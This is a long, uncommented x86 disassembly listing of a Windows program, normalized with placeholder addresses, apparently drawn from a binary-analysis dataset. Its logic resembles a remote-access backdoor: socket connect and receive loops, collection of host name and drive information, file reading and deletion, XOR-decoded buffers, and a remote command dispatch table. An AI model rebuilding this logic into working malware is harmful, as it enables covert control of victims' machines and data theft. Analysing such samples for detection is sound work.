lea eax [ esp + 0x14 ]
mov [ rw-data ] edi
push eax
push ebx
push ebx
push sub_403340
push ebx
push ebx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] edi
push 0x2710
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
call sub_403190
push edi
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_4024e0
sub esp 0x10
mov ecx [ esp + 0x1c ]
push ebx
push esi
push edi
lea eax [ esp + 0xd ]
push 0xa
push eax
push ecx
mov [ esp + 0x18 ] 0x3a
call [ _itoa@IAT ]
mov edx [ esp + 0x3c ]
add esp 0xc
test edx edx
mov edi rw-data
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x20 ]
push ebp
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
mov edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0xa
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x3c ]
push ecx
call [ _itoa@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_4027a0
sub esp 0x10
mov ecx [ esp + 0x1c ]
push ebx
push esi
push edi
lea eax [ esp + 0xd ]
push 0xa
push eax
push ecx
mov [ esp + 0x18 ] 0x3a
call [ _itoa@IAT ]
mov edx [ esp + 0x3c ]
add esp 0xc
test edx edx
mov edi rw-data
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x20 ]
push ebp
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
mov edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0xa
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x3c ]
push ecx
call [ _itoa@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_402a60
mov eax 0x2008
call sub_405ed0
push ebx
mov ebx [ esp + 0x2010 ]
push ebp
mov ebp [ Ordinal_WSOCK32_16@IAT ]
push esi
push edi
xor edi edi
lea esi [ esp + 0x18 ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x2008
retn
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x4
mov [ esp + 0x14 ] eax
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call [ Sleep@IAT ]
mov eax edi
inc edi
cmp eax 0x1388
jg r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push rw-data
push edx
mov [ esp + ecx + 0x21 ] 0x0
call [ strstr@IAT ]
add esp 0x8
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
pop ebp
dec eax
pop ebx
add esp 0x2008
retn
mov eax [ esp + 0x10 ]
inc eax
inc esi
cmp eax 0x2000
mov [ esp + 0x10 ] eax
ja r-xdata
mov [ esp + 0x14 ] 0x0
jmp r-xdata
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0x1
push esi
push ebx
call ebp
test eax eax
je r-xdata
sub_402b40
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
test esi esi
mov [ eax ] esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
xor dl 0x23
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_402b70
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
push ebx
mov bl [ eax + ecx ]
or dl 0xff
sub dl al
add bl dl
mov [ eax + ecx ] bl
inc eax
cmp eax esi
jl r-xdata
pop ebx
sub_402ba0
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0xff
call [ GetComputerNameA@IAT ]
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0xff
push edx
mov [ ecx + rw-data ] 0x0
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
mov edi eax
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
sub_402c60
mov eax [ esp + 0x4 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_402c90
sub esp 0x124
push ebx
push ebp
push esi
push edi
mov edi 0x1
push 0x0
push edi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
mov esi [ Ordinal_WSOCK32_12@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x8004667e
push eax
mov [ esp + 0x1c ] edi
call esi
mov ax [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x30 ] edi
mov edi [ Ordinal_WSOCK32_9@IAT ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x20 ] 0x2
call edi
mov ecx [ rw-data ]
mov ebx [ Ordinal_WSOCK32_4@IAT ]
mov [ esp + 0x1e ] ax
mov eax [ rw-data ]
lea edx [ esp + 0x1c ]
push 0x10
push edx
push eax
mov [ esp + 0x2c ] ecx
call ebx
mov eax [ rw-data ]
mov ebp [ Ordinal_WSOCK32_18@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x30 ]
push ecx
push 0x0
push edx
inc eax
push 0x0
push eax
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
call sub_4035e0
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
push 0x0
push 0x1
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push 0x0
push 0x0
push sub_4033c0
push 0x0
push 0x0
call [ CreateThread@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
push ecx
push 0x8004667e
push eax
call esi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] 0x1
mov [ esp + 0x20 ] 0x2
call edi
push rw-data
mov [ esp + 0x22 ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push edx
mov [ esp + 0x2c ] eax
call ebx
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
inc edx
push 0x0
push edx
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x124
retn
mov edx [ rw-data ]
push edx
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
sub_402ea0
mov eax 0x2008
call sub_405ed0
mov eax [ rw-data ]
mov [ esp ] 0x1
cmp eax 0x53
je r-xdata
mov [ esp + 0x8 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ esp + 0x8 ] al
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx [ esp + 0x201c ]
mov edx 0x5
sub edx ebx
push esi
add eax edx
mov [ esp + 0x1d ] eax
call [ CloseHandle@IAT ]
lea eax [ esp + 0x18 ]
push 0x5
push eax
call sub_402120
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x59
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x2018 ]
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push ebp
call [ fopen@IAT ]
mov edi eax
push 0x0
push ebx
push edi
call [ fseek@IAT ]
mov eax [ rw-data ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ rw-data ] 0x55
call sub_403b60
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2008
retn
lea ecx [ esp + 0x18 ]
push 0x6
push ecx
mov [ esp + 0x21 ] 0x6
call sub_402120
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ esp + 0x10 ] 0x0
mov ebx [ fread@IAT ]
cmp esi 0x2000
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call [ fclose@IAT ]
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
push edi
call [ fclose@IAT ]
add esp 0x4
push 0x0
push ebp
call [ SetFileAttributesA@IAT ]
push ebp
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2008
retn
push edi
push 0x2000
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call ebx
mov esi eax
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x28 ]
push edx
push eax
lea ecx [ esp + 0x30 ]
push 0x2000
push ecx
call sub_402b40
lea edx [ esp + 0x38 ]
push esi
push edx
call sub_402080
add esp 0x28
test eax eax
je r-xdata
sub_403080
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x200 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x20c ]
or ecx 0xffffffff
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
mov ebx ecx
inc ebx
cmp ebx eax
jge r-xdata
mov [ rw-data ] 0x4f
call sub_403b60
pop edi
pop esi
pop ebx
add esp 0x400
retn
push ebp
mov eax [ rw-data ]
inc ebx
cmp ebx eax
jl r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call [ DeleteFileA@IAT ]
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea edx [ ecx + ebx ]
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push edx
lea ebx [ ebx + ecx + 0x1 ]
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + ebx ] 0x30
jne r-xdata
pop ebp
sub_403190
mov ecx [ rw-data ]
sub esp 0x100
mov eax ecx
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
movsx edx [ rw-data ]
mov ecx [ rw-data ]
xor esi esi
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbf
cmp eax 0x17
ja r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
cmp eax esi
je r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_4032dc ]
jmp [ ecx * 4 + jump_table_4032bc ]
pop edi
mov eax 0x1
pop esi
add esp 0x100
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ rw-data ] esi
[ edi ]
not ecx
add ecx 0x4
mov edi rw-data
mov [ esp + 0x9 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xd ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x8 ] 0x5a
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x4
push ecx
lea ecx [ esp + 0xc ]
push ecx
call sub_402120
add esp 0x8
call sub_4037a0
jmp r-xdata
call sub_403780
jmp r-xdata
call sub_403080
jmp r-xdata
call sub_403e80
jmp r-xdata
call sub_403060
jmp r-xdata
call sub_403b90
jmp r-xdata
mov [ rw-data ] esi
sub_4032e4
pop es
add [ edi ] al
pop es
pop es
pop es
pop es
add al 0x7
add eax 0x3070700
pop es
push es
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov ebx [ SetEvent@IAT ]
push esi
mov esi [ WaitForSingleObject@IAT ]
push edi
mov edi [ Sleep@IAT ]
push 0x3e8
call edi
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call ebx
call sub_405710
mov eax [ rw-data ]
push 0x0
push eax
call esi
test eax eax
jne r-xdata
sub_403340
push ebx
push ebp
mov ebp [ GetTickCount@IAT ]
push esi
push edi
call ebp
mov edi eax
mov [ rw-data ] edi
mov ebx edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x4
call ebp
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
mov edx [ rw-data ]
mov ecx esi
sub ecx edx
cmp ecx 0x1b7740
jbe r-xdata
call sub_401c60
mov edi esi
mov edx esi
sub edx ebx
cmp edx 0x2710
jbe r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] esi
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
mov ebx esi
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_4033c0
mov eax 0x2004
call sub_405ed0
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov cl [ esp + 0x14 ]
sub ebp 0x5
mov [ rw-data ] cl
mov [ rw-data ] 0x0
call sub_4034e0
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov edi [ rw-data ]
mov ecx eax
lea esi [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub ebp [ rw-data ]
test ebp ebp
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2004
retn 0x4
lea eax [ esp + 0x14 ]
push 0x5
push eax
call sub_403560
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x15 ]
cmp ebp 0x5
jl r-xdata
push 0x1
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ebp ebp
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ esp + 0x14 ] 0x5a
jne r-xdata
lea edx [ esp + 0x14 ]
push ebp
push edx
call sub_403560
add esp 0x8
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
sub_4034e0
push ecx
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ Ordinal_WSOCK32_111@IAT ]
push esi
mov esi [ Ordinal_WSOCK32_16@IAT ]
push edi
xor edi edi
test eax eax
jle r-xdata
call ebp
cmp eax 0x2733
jne r-xdata
push 0x1
call ebx
jmp r-xdata
mov al [ esp + 0x13 ]
cmp al 0xd
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x1
call ebx
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x17 ]
push 0x1
push eax
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
inc edi
cmp edi 0x4
jge r-xdata
cmp al 0xa
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
push 0x1
xor edi edi
call ebx
jmp r-xdata
sub_403560
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor esi esi
xor ebx ebx
cmp edi 0x2000
jle r-xdata
test edi edi
jle r-xdata
mov edi 0x2000
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov edx [ rw-data ]
mov eax edi
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_4035e0
sub esp 0x48c
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x9d ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x98 ] 0x41
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x298 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
mov ebp ecx
mov ecx [ rw-data ]
add ebp 0x6
push 0x200
mov [ esp + 0x18 ] 0x0
mov [ esp + ebp + 0xa0 ] ecx
add ebp 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x98 ]
push ebp
push edx
mov [ esp + 0xa1 ] ebp
call sub_402120
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x48c
retn
mov al [ esp + 0x298 ]
test al al
je r-xdata
push ebx
lea ebx [ esp + 0x29c ]
mov [ esp + 0x1c ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x30 ]
push 0x80
push ecx
push ebx
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea esi [ esp + ebp + 0x9c ]
[ edi ]
not ecx
dec ecx
mov edi ebx
mov edx ecx
or ecx 0xffffffff
inc edx
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
